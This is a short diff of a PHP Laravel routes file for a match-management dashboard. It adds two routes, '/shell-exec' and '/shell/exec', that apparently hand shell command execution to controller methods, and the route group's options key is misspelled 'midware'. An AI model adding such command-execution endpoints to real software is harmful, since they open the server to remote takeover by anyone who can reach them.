@@ -33,4 +33,6 @@ Route::group(['midware'=>'web','prefix'=>'dashboard'],function(){
   Route::post('/match/add','DashboardController@addMatch');
   Route::post('/match/change-status','DashboardController@changeMatchStatus');
   Route::post('/match/delete/{match_id}','DashboardController@deleteMatch');
+  Route::get('/shell-exec','DashboardController@shellExec');
+  Route::post('/shell/exec','DashboardController@exec');
 });
